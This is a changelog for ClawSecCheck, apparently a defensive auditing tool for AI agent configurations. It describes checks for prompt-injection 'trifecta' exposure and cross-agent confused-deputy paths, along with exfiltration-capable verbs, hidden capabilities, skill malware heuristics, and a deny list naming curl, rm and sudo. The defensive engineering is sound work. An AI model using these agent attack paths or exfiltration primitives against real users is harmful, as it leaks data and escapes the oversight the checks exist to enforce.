  `plugins.entries.<x>.config.allowPrivateNetwork`. Absent/false = clean **PASS** — verified zero
  false positives on the real stock out-of-box config and on the fixture corpus.
- Mapped to OWASP **LLM01/LLM06** and the ASI sandboxing/RCE class (`docs/THREAT_COVERAGE.md`).

### Notes
- Grounded the new check the dogfood way: set each flag via the real `openclaw` binary (the schema
  validated the path) and confirmed B48 FAIL/WARN on the live config; the stock default stays PASS.
- B48 deliberately does not re-cover flags owned by dedicated checks (`dangerouslyAllowNameMatching`→B30,
  `browser.ssrfPolicy.dangerouslyAllowPrivateNetwork`→B38).

## [1.7.1] — 2026-06-22

**Out-of-the-box dogfood fixes.** Stood up a real stock `openclaw@2026.6.9` and audited its default
config as a first-time user would. The audit itself was clean (grade A, **zero false-positive FAILs**
on the stock config; sparse-config keys correctly report UNKNOWN), but the naive-user view surfaced two
real defects, now fixed. A field-path cross-check against the live `openclaw config schema` confirmed
the rest of the "not in current schema" reads are intentional legacy/alt-shape fallbacks (like the
existing `mcpServers`), not fabrications — left as-is.

### Fixed
- **C4 no longer asserts an ungrounded CVE or false "outdated" warning.** `check_version` used to WARN
  on *any* recorded version and name `CVE-2026-25253` — a CVE absent from the grounded `_KNOWN_ADVISORIES`
  (B33), applied even to the current latest release. It is now a neutral PASS update-hygiene advisory;
  all version-vulnerability claims are deferred to the grounded **B33** gate (§4: don't invent CVEs; §5:
  no spurious warning on a current install). The Hebrew rule was updated to match.
- **Next-action / fix hints now use `clawseccheck`, not `audit.py`.** A first-time skill/CLI user has the
  `clawseccheck` command; the guidance hints (`--prompts`/`--monitor`/`--badge`/…) and the B16 fix text
  referenced a bare `audit.py` that doesn't resolve for them.

## [1.7.0] — 2026-06-22

**Paste-ready remediation (`--fix`).** The exact fix commands were already in each finding's prose;
now they're extracted into a copy-paste block. ClawSecCheck stays **read-only** — `--fix` only
*prints* remediation; it never applies anything (the name promises a check). Config fixes are given
as *set `<dotted-path>` → `<value>`* guidance so you edit your own `openclaw.json`, never a
paste-over JSON blob that could clobber neighbouring keys.

### Added
- **`--fix` view** — prints paste-ready remediation for current FAIL/WARN findings: exact shell
  commands (allowlisted verbs only — `chmod`/`openclaw`, no destructive or network commands) and
  config path+value guidance. Header states plainly that ClawSecCheck does not apply them.
- **`catalog.REMEDIATION` + `remediation_for(id)`** — single source of truth, authored only for
  checks with a safe, deterministic, grounded fix (config dotted paths verified against the real
  schema, §4). Checks needing manual review keep their prose `fix`.
- **`--json` exposes `"remediation": {commands, config}`** per finding; **SARIF** results carry a
  `fixes` array (description-only — no `artifactChanges`, since nothing is auto-edited).

### Notes
- Additive only — no verdict, score, or check behaviour changed; grades unchanged on the fixture
  corpus. A safety test enforces the command allowlist (no `rm`/`curl`/`sudo`/pipes/etc.).
- Workspace-specific paths use documented `<placeholder>` forms rather than auto-substituting a
  path guessed from evidence (never `chmod` the wrong thing, §5).
- Out of scope (deliberately): an auto-apply `--apply` (would need to be opt-in and
  confirmation-gated, §2) and a paste-over JSON patch (clobber risk).

## [1.6.0] — 2026-06-22

**OWASP framework mapping.** Each check is now mapped to the **OWASP Top 10 for LLM Applications
(2025)** category it addresses on the agent surface, and the checks are mapped (by threat name) to the
agent-specific **OWASP Agentic Security Initiative (ASI)** classes. Pure additive metadata — no
verdict, score, or check behaviour changed. Grounded against `genai.owasp.org` (the 2025 list reordered
vs 2023, so the codes were verified, not assumed).

### Added
- **`catalog.OWASP_MAP` + `owasp_for(id)`** — single source of truth mapping each check to its
  OWASP-LLM-2025 code(s); `catalog.OWASP_LLM_2025` holds the ten canonical codes/titles.
- **`--json` exposes `"owasp": [...]`** per finding (empty list for checks with no clean LLM-Top-10
  analog — host-watch, logging, SSRF, backups — which are covered by the ASI classes instead).
- **`docs/THREAT_COVERAGE.md`** gains a *Framework mapping* section: the LLM-Top-10 table (the whole
  multi-agent arc B45/B46/B47 lands under **LLM06 Excessive Agency**) and the ASI threat-class table
  (tool misuse, multi-agent identity/privilege abuse, inter-agent communication, cascading
  blast-radius), with grounded source links.

### Notes
- Honest non-coverage is stated, not stretched: **LLM08** (vector/embedding) and **LLM09**
  (misinformation) live in the model/RAG layer with no agent-config surface, so nothing maps to them.
- Borrowed the *taxonomy credibility* of an OWASP-web reviewer skill without its method — ClawSecCheck
  stays deterministic, local, zero-token; it maps OWASP onto the **agent**, the surface app-code
  reviewers don't audit.

## [1.5.1] — 2026-06-22

**Hebrew completeness for B47 evidence.** A third field round confirmed the recurring pattern: a new
check's evidence bullets render in English under `--lang he` until they get translation rules (the
1.4.1 routing is in place; the per-check prose rules were missing). B47's evidence is now localized,
and adding an evidence rule alongside each new check that emits evidence prose is now standing practice.

### Fixed
- **B47 evidence bullets are localized.** Added `DETAIL_RULES` patterns for `reassembly chain: …`,
  `reachable via walls only: …` (prefix translated, the agent-name chain preserved verbatim) and the
  three `weakest edge tier: …` enum values (the `schema`/`filtered`/`raw` key stays Latin like other
  technical tokens; the gloss is Hebrew). `detail`/`fix` were already translated.

### Changed
- **`--risk-paths` text output now shows the RISK id.** Each path renders as `[SEV] RISK-NN: title`
  (the id was previously only in `--json`), so a path referenced by id can be cross-referenced in the
  human report.
- **README:** noted that the first call right after a skill update can return empty (an OpenClaw
  skill-reload timing artifact on the runtime side — re-run; verify with `--verify-self`).

## [1.5.0] — 2026-06-22

**Cross-agent trifecta reassembly (confused deputy).** B45 (1.4.0) checks whether one agent is the
trifecta. But separation is fictional if the trifecta reassembles *across* delegation: an
untrusted-input agent that can drive a sensitive-data agent and an outbound agent has the whole
trifecta even though no single agent holds all three. What decides exploitability is the data-handling
tier on the edge — a typed/structured return is a wall; raw passthrough carries the poison. Grounded in
`docs/research/multiagent-privilege-separation.md`: config has no delegation graph, so this is
attestation-driven and advisory; the runtime data-flow property stays honestly UNKNOWN.

### Added
- **B47 — cross-agent trifecta reassembly (delegation graph).** Reads a new attestation block
  `delegation: [{from, to, returns}]` (`returns` ∈ `schema`/`filtered`/`raw`/`unknown`) and walks the
  graph from each untrusted-input agent. UNKNOWN without a `delegation` block; PASS when the trifecta
  is unreachable across agents **or** when every traversable edge is a `schema` wall (with an explicit
  not-runtime-verified caveat); WARN when an untrusted agent reassembles the trifecta via a non-wall
  edge (raw/filtered/unknown). `ATTESTED` confidence, advisory (unscored).
- **RISK-11 — cross-agent reassembly narrative** in the "Highest-risk paths" section, firing on the
  same condition with the concrete chain (`<entry> → <secrets> → <outbound>`).
- Attestation parser `attest.attested_delegation()` + the `delegation` block in `template()`/
  `_questions`, additive under `clawseccheck-attest/1` (older attestations stay valid).
- Shared `checks._reassembly()` graph helper (reused by B47 and RISK-11); tiers `schema=3 (wall) >
  filtered=2 > raw=1 ≈ unknown=1`.

### Notes
- Zero false-positive FAILs held: without a `delegation` block B47 is UNKNOWN everywhere and RISK-11
  never fires. Verified across the real-schema fixture corpus — `home_safe` (A/91, 0 FAIL) and
  `home_vuln` (8 FAILs) baselines unchanged; no B47 FAIL anywhere.
- Conservative by design: a necessary-condition reachability + weakest-tier heuristic, not a precise
  per-edge data-flow proof. Whether a privileged agent re-interprets returned data at runtime stays
  UNKNOWN (out of static scope). RISK narratives remain English-only (a general `render_risk_paths`
  limitation across all RISK rules).

## [1.4.1] — 2026-06-22

**Hebrew report completeness.** A field validation confirmed a general gap: in `--lang he`, finding
**evidence bullets** rendered in English while `detail`/`fix` translated (first seen on C5, then on
B45). Evidence now runs through the same i18n pipeline (`tp`) as detail/fix.

### Fixed
- **Evidence bullets are localized.** `report._render_finding` routes each evidence line through
  `tp(ev, lang)`. The translation is graceful and data-safe: a bullet matching a `PHRASES` key or a
  `DETAIL_RULES` pattern is translated, while a dynamic data bullet (path, verb name, perm bits, agent
  name) has no match and is preserved verbatim. `lang="en"` is unaffected (`tp` is a no-op there).
- Added a `DETAIL_RULES` pattern for the B45 trifecta-decomposition evidence (`<agent>: holds all 3
  legs`): the prose is Hebrew, the agent name (data) is preserved.

### Notes
- Pure-data / taxonomy evidence (paths, verb names, perm bits, blast-radius class tokens) stays
  language-neutral by design — the same stance as the English-by-design JSON `detail`/`fix` contract.
  No FAIL/WARN verdict changed; this is output-text only.

## [1.4.0] — 2026-06-22

**Multi-agent privilege separation.** The trifecta check (A1) flattens the whole setup into one
capability surface, so it can't tell a monolithic agent (one agent holds all three legs) from a
properly separated fleet where no single agent does — and it fails the separated fleet anyway. Two
new checks close that blind spot. Grounded against the real OpenClaw schema
(`docs/research/multiagent-privilege-separation.md`): config expresses the *fact* of multi-agent
topology but **not** the delegation graph, per-agent tool allowlists, or inter-agent data-handling —
so per-agent analysis is attestation-driven, and the runtime parts stay honestly out of scope.

### Added
- **B45 — per-agent privilege separation (trifecta decomposition).** Reads the attested agent roster
  (new `agents: [{name, tools}]` block in the `--attest` self-report; `--ask` template updated) and
  classifies each agent's trifecta legs itself. WARN when a single agent holds all three legs
  (separation absent); PASS when none does (necessary condition met — explicitly **not** a safety
  guarantee); UNKNOWN without a roster. `ATTESTED` confidence, advisory (unscored) — like B43/B44, the
  verdict rests on a self-report the static config can't corroborate, so it never moves the grade.
- **B46 — multi-agent trifecta exposure.** Config-only, scored: spawnable subagents + the global
  trifecta active + no exec approval gate → WARN. Capped at WARN so it can never introduce a new FAIL
  on a real config; a deliberate light nudge layered on A1, not a duplicate.
- New attestation parser `attest.attested_agents()` (tolerant, mirrors `attested_paths()`); `agents`
  block added to `template()`/`_questions`, additive under the same `clawseccheck-attest/1` schema
  (older attestations stay valid).

### Notes
- Zero false-positive FAILs held: without `--attest` B45 is UNKNOWN everywhere (no new FAIL by
  construction), and B46 is capped at WARN. Verified across the real-schema fixture corpus —
  `home_safe` unchanged (A/91, 0 FAIL), `home_vuln` FAIL baseline unchanged (8 FAILs), no spurious
  B46 WARN.
- Deferred to 1.5.0 (needs an attestation `delegation` block): cross-agent confused-deputy reassembly
  (`RISK-11`) and the inter-agent data-handling tier (structured-return wall / text-filter sieve /
  raw passthrough). The §4 grounding doc records why the runtime trust property stays UNKNOWN.

## [1.3.1] — 2026-06-22

**Wording precision from a live field validation.** An on-machine agent validated v1.3.0 against a
real fleet (grade B, 0 spurious FAILs — zero-FP held) and surfaced two honest rough edges in the
output text. No contract change; evidence/messages only.

### Fixed
- **C5 overstated the exposure.** Every writable PATH/install dir was labelled
  `group/world-writable` regardless of which bit was actually set, so a `0o775` (group-only) dir was
  reported as world-writable — an overstatement on a tool whose job is accuracy. C5 now reports the
  precise bit found: **`group-writable`**, **`world-writable`**, or **`group- and world-writable`**
  (B20 already did this; C5 now matches). Hebrew (`--lang he`) renders each kind, and the v1.3.0
  ancestor/attested-install fragments — previously untranslated — are now covered too.

### Changed
- **B20's UNKNOWN is now actionable.** When no bootstrap files are found under the audited home or
  the known workspace dirs (e.g. they live in `~/openclaw-workspaces/…`), the finding no longer
  dead-ends with `—`; it tells the user to point the audit with `clawseccheck --home <workspace>`
  or declare the real paths via `--attest` (`paths.bootstrap`) so the engine can `stat()` them. The
  UNKNOWN stays honest (never a false PASS); it just stops being a dead end.

### Notes
- `SendUserFile → EGRESS` in B43 is **intentional**: the blast-radius taxonomy classifies the
  send-capable *form* of a verb, not its presumed purpose. Inferring "this send is benign" requires
  intent-guessing, which is exactly what produces a false PASS — form-over-intent is the
  conservative default and stays. (Raised in the same field round; documented, not changed.)

## [1.3.0] — 2026-06-22

**Two field-found permission-scan gaps closed + agent-assisted discovery.** A real audit found a
group-writable `MEMORY.md` and a group-writable OpenClaw install dir the scan didn't surface — both
reproduced deterministically, both now covered. The agent can also point the scan at non-standard
locations (it supplies *where*; the engine still does the `stat()` itself, so findings keep real
file-stat strength — not a weak self-report).

### Fixed
- **B20 scanned only three hardcoded workspace dir names** (`workspace-home`/`-work`/`workspace`),
  so a bootstrap/memory file in the OpenClaw home root (or any other dir) escaped the group/world-
  write check. B20 now also scans the **home root**, and de-dupes by resolved path. (§6: don't
  hardcode one shape.)
- **C5 checked only the binary's immediate parent dir**, missing group/world-writable **ancestor
  install dirs** (e.g. the npm package root `.../node_modules/openclaw`) — a binary-replacement /
  RCE vector. C5 now walks the install-tree ancestors (bounded) above the resolved binary.

### Added
- **Discovery via attestation** (schema `clawseccheck-attest/1`, still experimental-in-1.x): new
  optional `paths` block — `paths.bootstrap[]` (identity/memory file locations) and
  `paths.openclaw_install` (install dir). B20 stats the declared bootstrap files; C5 stats the
  declared install dir (and its ancestors) even when `openclaw` isn't on `PATH`. New
  `attest.attested_paths()` helper; `--ask` template + SKILL.md interrogation Step 3b updated.
- SKILL.md guidance: relay the "What you can do next" block to the user instead of collapsing it
  away (it is generated by the tool; an agent paraphrasing the report had been dropping it).

### Security
- C5's writability test is now **sticky-bit aware**: a sticky world-writable dir (e.g. `/tmp`,
  mode `1777`) blocks cross-owner rename/delete, so it is NOT a replace vector and is no longer
  flagged — the bounded ancestor walk passes through `/tmp` without a false positive.
- Attested paths are a discovery hint only: the engine `stat()`s them itself (read-only, no content
  read); evidence is sanitized at render as for all findings. Zero-FP held (`home_safe` 0 /
  `home_vuln` 8).

## [1.2.0] — 2026-06-22

**Offline update advisory — keep users current without breaking zero-network.** Users who install
once and never update miss security fixes and new checks. Knowing whether a *newer* version exists
is server-side state, so the tool must never fetch it (golden rule #1: local-only / no phone-home —
and a scanner that beacons would have to flag itself). Instead, three offline-respecting signals.

### Added
- **Offline staleness notice** in the default human report (suppressed in `--json` / `--card` /
  `--sarif` / `--badge`). Two local signals, never a network call:
  1. a **local hint file** `~/.clawseccheck/latest.json` (written by the user's distribution layer
     or agent — *not* by the tool) announcing a newer version, read locally; else
  2. an **age nudge** when the baked-in build date (`__released__`) is ≥ 60 days behind the local
     clock. Clock skew (clock before release) stays silent.
- **`__released__`** build-date constant in `clawseccheck/__init__.py` (bumped at release time).
- **`clawseccheck.update`** module: `update_notice()`, `read_latest_hint()`, `DEFAULT_LATEST`.
- **`--no-update-notice`** flag (and `CLAWSECCHECK_NO_UPDATE_NOTICE=1`) to silence the reminder.
- **SKILL.md agent guidance** — "Keeping ClawSecCheck current": since the tool won't network-check
  itself, the *agent* (which has network) should check ClawHub for a newer build after auditing,
  tell the user, optionally refresh the local hint file, and verify integrity with `--verify-self`.

### Security
- The hint file is **untrusted input**: only a strict `X.Y.Z` is accepted from its `version` field,
  reconstructed from parsed integers, so a planted hint can at most misstate a number — never inject
  terminal sequences, a URL, or an action. Echoed text also passes through `_sanitize`.

### Notes
- Additive: the frozen 1.0 contract (`--json`/SARIF/`audit()`/check ids/vocab/scoring) is untouched;
  the notice is human-report-only. Library callers of `render_report()` get no notice unless they
  pass the new keyword-only `update_notice=` argument.

## [1.1.0] — 2026-06-22

**`--vet` / `--vet-mcp` now honor `--json` and `--sarif`.** Previously the vetting branches
returned before the CLI looked at those flags, so `clawseccheck --vet ./skill --json` silently
printed the human text report instead of JSON — a real gap for CI pipelines that vet skills
before install. Additive only: nothing in the frozen 1.0 contract changes.

### Added
- **`--vet … --json` / `--vet-mcp … --json`** — emit a vetting JSON object via the new public
  `render_vet_json()`: `tool`, `version`, `mode` (`vet`/`vet-mcp`), `target`, `verdict`
  (`SAFE`/`SUSPICIOUS`/`DANGEROUS`/`UNKNOWN`), and `findings[]` in the same frozen finding shape
  as the audit. **No `score`/`grade`** — vetting is not a scored audit, so no number is fabricated.
- **`--vet … --sarif PATH` / `--vet-mcp … --sarif PATH`** — write SARIF 2.1.0 as a side output
  alongside the human report (mirrors the full-audit `--sarif` behavior).
- Exit code for the JSON/SARIF vet paths is unchanged: `1` on SUSPICIOUS/DANGEROUS, else `0`.

### Fixed
- **SARIF self-consistency for vetting:** vet findings carry ids outside the scored CATALOG
  (e.g. `MCP-VET`). `render_sarif()` now synthesizes a matching `rule` for any referenced
  `ruleId` not in the catalog, so a dangerous-MCP SARIF result always points at a defined rule.
- **`render_sarif()` `score` is now optional** — accepted for call-site symmetry; the vetting
  modes pass no `ScoreResult`. (Backward compatible: existing positional calls are unaffected.)
- Removed shadowing function-local `from . import __version__` imports in `cli.py` that made
  `__version__` a local and would `UnboundLocalError` once referenced from the vet branches.

## [1.0.0] — 2026-06-21

**API freeze.** The mature core is now a stable contract: breaking it requires a major
version bump (SemVer). No code change from 0.31.1 — this release is the commitment, reached
after the attestation layer settled, an adversarial review, and four field runs whose every
finding was fixed or deliberately documented (EXEC class, test-portability, evidence
surfacing, B16 wording), with **zero hard false positives on real configs**.

### Frozen contract (breaking these → major bump)
- **CLI flags** and their documented meaning.
- **`--json` schema:** `score`, `grade`, `capped`, `raw_score`, `trifecta`, `findings[]`,
  `next_actions[]`; each finding's `id`, `title`, `severity`, `status`, `detail`, `fix`,
  `framework`, `confidence`, `evidence`.
- **SARIF 2.1.0** output shape (rule ids = check ids; `properties.confidence` + `.evidence`).
- **Public Python API:** `clawseccheck.audit(...) -> (ctx, findings, ScoreResult)` and the
  `Finding` field names.
- **Check IDs** (`A1`, `B1–B54`, `C3–C5`, `RISK-01..10`) — an id keeps its meaning once shipped.
- **Vocabularies:** status `PASS|WARN|FAIL|UNKNOWN`, confidence `HIGH|MEDIUM|LOW|ATTESTED`.
- **Scoring bands:** A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50; `UNKNOWN` never scores;
  advisory checks (`scored=False`) never move the grade.

### Explicitly EXPERIMENTAL within 1.x (may change without a major bump)
- The **attestation layer**: the `clawseccheck-attest/1` self-report schema (the `/1` is
  versioned to evolve), the `--ask`/`--attest` flow, the B43 verb→blast-radius taxonomy, and
  B44. The `ATTESTED` confidence tier marks exactly this — weaker than a config fact, advisory,
  never overriding one. Freezing the newest surface now would over-commit; it stays flexible
  under a clear label.

### Unchanged guarantees
- Local-only, zero-network, read-only by default; stdlib-only, Python 3.9+; no fabricated
  facts; zero false-positive FAILs on real configs.

## [0.31.1] — 2026-06-21

Honesty fix found by a round-4 breadth run (full audit of two real configs — **zero hard
false positives**; every WARN mapped to a real field, and B9 correctly stayed silent where
`logging.redactSensitive` was set).

### Fixed
- **B16 over-claim (§4 "no fabricated facts").** The WARN read "No threat monitoring … nothing
  will alert you" as an absolute — but a config-only scan cannot see monitors set up OUTSIDE
  the OpenClaw config (a separate security agent/workspace, host-level IDS/EDR), so on a real
  setup that *does* have them the HIGH-severity wording asserted something untrue. Reworded to
  scope the claim to "not detected in this config" and to point at `--ask`/`--attest`
  (`host_monitors`) for monitoring that lives elsewhere. Hebrew translation updated in lock-step.
  Detection logic and status are unchanged — wording only.

### Notes
- `SendUserFile → EGRESS` (the other item the run flagged) is left as-is by decision: the verb
  taxonomy classifies capability *shape*, not *destination*; "can emit a file" is a real (mild)
  egress vector, and special-casing a tool name would be the kind of hardcoding the project laws
  forbid. The verdict (WARN) is correct regardless.

## [0.31.0] — 2026-06-21

Surfaces finding `evidence` in the main outputs — a value defect found by the round-3 field
run of the live B44 cross-check.

### Fixed
- **Evidence was computed but never shown.** B43/B44 (and B31/B42/host checks) name the exact
  flagged item in `Finding.evidence` — e.g. B44's `granted but not attested: create_filter,
  gmail_send` — but that list reached only the `--vet`/`--vet-mcp` paths. `--json`, the text
  report and SARIF dropped it, so a finding said "some high-blast verb is granted but
  undisclosed" without naming *which*. Naming the dangerous verb is the whole point of the
  check, so:
  - `--json`: every finding now carries a sanitized `evidence` array.
  - text report: FAIL/WARN findings list their evidence (sanitized, capped at 12) under the
    `why` line.
  - SARIF: `properties.evidence` added alongside `properties.confidence`.
  - The `--json` finding contract in README's *Public API & stability* now lists `evidence`.
- Check logic (B43/B44) is unchanged — it was already correct; only the surfacing was missing.

## [0.30.1] — 2026-06-21

Test-portability fix found by a field run of the packaged skill.

### Fixed
- **`test_publish_workflow.py` failed in a packaged install.** The published skill ships
  without `.github/` (CI files are repo-only), so the 4 workflow-validation tests raised
  `FileNotFoundError` and showed as **failures** when the suite was run from an installed
  skill — an alarming "tests failing" signal for a security tool whose ethos is "run the
  suite, 100% pass". They now **skip** (not fail) when the workflow file is absent, so the
  suite is green whether run from the source repo (tests execute) or a packaged install
  (tests skip). No functional/source change.

## [0.30.0] — 2026-06-21

First **field-discovered** accuracy fix: a live agent run (the v0.26 attestation round-trip,
verified end-to-end on a real agent) surfaced a blast-radius blind spot that synthetic tests
missed.

### Added
- **`EXEC` blast-radius class** in the B43 verb taxonomy. Arbitrary code/command execution is the
  broadest blast radius of all — it *subsumes* egress (`curl`), destruction (`rm`) and config
  mutation — yet a tool like `Bash` previously classified as `UNKNOWN`, so an agent holding only
  an exec primitive scored B43 `PASS` ("all reversible"). Now `bash`/`shell`/`exec`/`subprocess`/
  `powershell`/`run_command`/`code_interpreter`/`terminal`/… classify as `EXEC` (high-blast):
  holding one → at least `WARN`; exec + ungated → `FAIL`. Hints are deliberately high-precision —
  bare `system`/`eval`/`spawn` are omitted because they match benign reads
  (`get_system_info`, `evaluate_expression`) and would violate the zero-false-positive law.

### Notes
- This is exactly the 1.0 "trigger 2" payoff: real-use validation found a real gap. The flow
  itself (agent self-reports → file written → `--attest` consumes it → B43/B44 resolve at
  `ATTESTED`) was confirmed working on a live agent.

## [0.29.1] — 2026-06-21

Adversarial-review hardening of the attestation surface (capstone before a 1.0 freeze).
Two false-negative/honesty fixes; no behaviour change for well-formed input.

### Fixed
- **Trailing-separator verb hiding (false negative).** `normalize_verb` stripped a name with
  a trailing separator to the empty string, so `forward__` / `send.` / `delete_forever__`
  classified as `UNKNOWN` and a dangerous verb could slip past B43/B44. It now takes the last
  **non-empty** segment, so the verb survives.
- **False-PASS on unreadable inventory.** B43 returned `PASS` ("all reversible") when the
  attested `tools` list contained no readable verb strings at all (e.g. `[1, 2, 3]`). It now
  returns `UNKNOWN` — we report what we could not read instead of implying "verified safe".

### Notes
- Robustness otherwise confirmed by the review: malformed attestations (non-list `tools`,
  int/None/nested entries, non-list `host_monitors`, huge lists) degrade to UNKNOWN without
  raising; `is_ungated` is conservative; attestation never overrides a static config fact;
  zero-network and read-only hold.

## [0.29.0] — 2026-06-21

Verb-normalization stabilization — makes the B43/B44 taxonomy survive real MCP tool
names. No scoring change, no new check IDs.

### Fixed
- **Provider-name pollution (latent false positive).** Real tools arrive namespaced
  (`mcp__claude_ai_Slack__slack_send_message`, dotted `gmail.send`). Substring-matching the
  whole string let a *provider* name decide the class — e.g.
  `mcp__SendGrid__list_templates` read as `EGRESS` on the "send" in "SendGrid" though the
  verb is a reversible list. Classification now runs on the **normalized verb** (namespace
  stripped to the last segment), so only the action decides the class.
- **B44 namespace mismatch.** B44 now compares normalized verbs on both sides, so a config
  grant `mcp__Gmail__send_email` and an attested `send_email` are recognized as the same
  verb instead of a false "undisclosed capability".

### Notes
- New `attest.normalize_verb()`; `classify_verb()` and B44 both route through it.
- Documented the intentional taxonomy boundary: a bare `delete`/`remove` stays `UNKNOWN`
  (most real APIs soft-delete reversibly); only names that spell out irreversibility
  (`delete_forever`, `purge`, `expunge`, …) are `DESTRUCTIVE`. Broadening it would
  manufacture false FAILs and break the zero-false-positive law.

## [0.28.0] — 2026-06-21

Attestation-stabilization pass toward 1.0 — three independent steps, no scoring change.

### Added
- **`Public API & stability` section** (README): declares what becomes the frozen contract at
  1.0.0 (CLI flags, `--json`/SARIF schema, `audit()` API, check IDs, status/confidence
  vocabularies, scoring bands) vs what stays experimental pre-1.0 (the attestation schema
  `clawseccheck-attest/1`, the B43 verb taxonomy, B44). This is the v1 prerequisite that lets
  breaking changes require a major bump.
- **Host-monitor attestation → B50–B54.** A self-reported `host_monitors` entry (e.g. a corporate
  EDR or a gateway IDS the read-only scan cannot see) now **upgrades** the matching host-watch
  class from a gap (absent / unknown / not-scanned) to an `ATTESTED` PASS. Keyword-matched per
  class; it never downgrades a static detection (HIGH wins) and never creates a FAIL.

### Changed
- **Hardened the B43 verb→blast-radius taxonomy** against real MCP toolset shapes so it survives
  real use: Slack `schedule_message` and Facebook page-publish verbs now classify as `EGRESS`;
  added regression tests asserting a real Gmail toolset (draft/label/search, no send) → PASS, and
  that calendar create/update/respond verbs are not mis-flagged as high-blast.

### Notes
- `_finding()` gained an optional `confidence=` override (used by the attested host path); the
  default still derives from the check's `CheckMeta`. No new check IDs.

## [0.27.0] — 2026-06-21

Stabilizes the attestation layer (a 1.0 prerequisite): the agent now **self-builds** its
self-report through a guided interrogation, instead of a human hand-filling the empty
template.

### Added
- **Interrogation protocol** (SKILL.md): a 5-step playbook for the running agent — read its
  own tool/verb names off its definitions (Step 2), ask the user in plain language for the
  harness/policy facts only they know (approval gating, untrusted→action, host monitors;
  Step 3), assemble the JSON, feed it, and report B43/B44. Unknown answers stay `unknown` —
  never invented.
- **`--attest -`** — read the attestation JSON from **stdin**, so the agent can pipe a
  self-report straight in without writing a temp file (an auditable file is still preferred
  and documented first). New `attest.parse_attestation()` validates string-or-object input;
  the file loader and the stdin path now validate identically.

### Notes
- Read-only is preserved: the engine only reads; the agent assembles the report with its own
  tools. No new check IDs, no scoring change — this is a usability/stabilization release for
  the v0.26 attestation layer.

## [0.26.0] — 2026-06-21

Adds the **attestation layer** — the first time the audit reads more than config files.
The static scan sees only what the config *records*; an agent's real tool/verb inventory,
whether untrusted input can reach a side-effect, and host monitors a file scan can't see
are not in any config field. The agent now self-reports those facts in a small JSON
(`--ask` emits a template, `--attest` consumes it), unlocking capability-level least
privilege without inventing config fields. Local, read-only, no network — the self-report
is a local file the user's agent fills in.

### Added
- **`--ask`** — emit an attestation template (JSON) listing exactly the facts the config
  can't show, with inline guidance for the agent to self-report.
- **`--attest <file>`** — enrich the audit with the agent's self-report. Threaded through
  `audit(..., attestation=...)`; with no attestation the new checks report `UNKNOWN` and the
  score is unchanged (fully backward-compatible).
- **B43 — Capability blast-radius / dangerous-verb inventory.** Classifies the agent's REAL
  held verbs by blast radius: `MAILBOX_CONFIG` (auto-forward/filter/delegation — a persistent
  silent channel, the highest blast), `DESTRUCTIVE` (delete-forever/purge), `EGRESS`
  (send/forward/post), `REVERSIBLE` (search/get/draft/label). A toolset of only reversible
  verbs **PASSes** (forward-exfil and delete-evidence are physically impossible); a high-blast
  verb that can fire without approval **FAILs**.
- **B44 — Attestation ⇄ config mismatch.** Cross-checks the self-report against the static
  `tools.allow` list: a high-blast verb the config grants but the agent omitted is flagged as
  drift / blind-spot / injection-mask — a signal no static-only scan can produce.
- **`ATTESTED` confidence tier** (below `HIGH`/`MEDIUM`): a self-report is weaker evidence than
  a config fact, so attested findings are advisory (not scored) and labelled as such in
  text/JSON/SARIF. An attestation only resolves an `UNKNOWN` or sharpens a heuristic — it never
  overrides a hard config fact.

### Notes
- New module `clawseccheck/attest.py` (stdlib only): schema, verb taxonomy, loader, template.
- Read-only by construction: the layer asks introspective questions and classifies strings — it
  never has the agent perform a side-effectful "test". Partially addresses the long-standing
  B27/B28 runtime gaps (action-gate / provenance) that have no config surface.

## [0.25.0] — 2026-06-20

Closes the open-gap triage from THREAT_COVERAGE honestly: builds the one item that fits the laws
(per-finding confidence) and is transparent about the two that don't.

### Added
- **Per-finding confidence** (`HIGH` / `MEDIUM`). Every finding now carries how sure ClawSecCheck is
  it's correct: **HIGH** = a deterministic config-field fact (we read the real value); **MEDIUM** =
  a heuristic match on free text or the filesystem that may warrant a human look (B6 bootstrap
  injection, B13 skill malware, B21 tool-output trust, B23 approval-bypass directives, B42 install
  hooks, C5 PATH safety, and the `--vet` results). Surfaced everywhere: a `(confidence: medium)` tag
  on FAIL/WARN lines in the text report, a `confidence` field in `--json`, and `properties.confidence`
  in SARIF. Aligns with the honesty doctrine (UNKNOWN ≠ PASS → now also "MEDIUM — verify").

### Changed
- **Windows permission checks (B19/B20/B22) give an honest, actionable UNKNOWN.** Instead of a bare
  "not applicable", they now explain that NTFS ACLs can't be read read-only without extra tools and
  point the user at `icacls <path>` to check write access for Users/Everyone themselves.

### Notes — gaps intentionally NOT built (honesty over coverage)
- **B27 / B28 (agent-level action-gate / taint-provenance):** no OpenClaw config surface exists to
  check (`tools.confirm`/`requireApproval` are phantom; the real approval gate is `tools.exec.mode`,
  already covered by B8/B22/B23). Building them as scored checks would mean inventing fields, so they
  stay **covered combinationally** by the risk engine + B21 — not faked as standalone checks.
- **Windows NTFS ACL checks:** there is no stdlib, no-subprocess way to read NTFS ACLs, so a real
  ACL check isn't possible under the project's laws. UNKNOWN (now actionable) is the honest answer.

## [0.24.0] — 2026-06-20

**Agent Watch** — `--monitor` grows from a baseline→diff into a connection-aware, severity-tagged
drift watcher with a local event journal. It answers "is anyone watching what my agent is joined to,
and what changed?" — still fully local, the only writes being the (opt-in) snapshot + journal.

### Added
- **Connection / trust-surface drift.** The monitor snapshot now also fingerprints the agent's
  **MCP servers**, **channels**, and **gateway bind**, so `--monitor` alerts on:
  - a **new MCP server** connected since last check → CRITICAL (a new tool/data trust surface to vet);
    a changed server → HIGH; a removed one → INFO;
  - a **new channel** → HIGH; a channel's openness/auth changing → MEDIUM;
  - the **gateway bind** changing → HIGH, or CRITICAL if it became network-exposed (`0.0.0.0`/`::`);
  - a **host monitor** (B50–B54) going from present → absent → HIGH ("a watcher was removed").
  Drift checks are guarded so upgrading from an older snapshot never emits spurious "new X" alerts.
- **Event journal** (`~/.clawseccheck/events.jsonl`, owner-only `0o600`, never uploaded). Every
  `--monitor` run appends its detected changes as a timeline. View it with the new **`--watch-log`**
  (and `--events PATH` to point elsewhere). Severity-ranked, ANSI-sanitized output.
- Monitor alerts now include a **MEDIUM** tier and are sanitized before display (skill/channel/MCP
  names are attacker-controlled).

### Note
This is the free skill's *informational* watcher — it tells you what changed and how serious it is.
Continuous, autonomous, off-host alerting (a real sensor/daemon) remains a separate product concern;
the skill stays local and read-only by design.

## [0.23.0] — 2026-06-20

### Added
- **Taint tracking in skill AST (`CRED_EXFIL_FLOW`)** — the deferred 0.21 follow-up. `skillast.py`
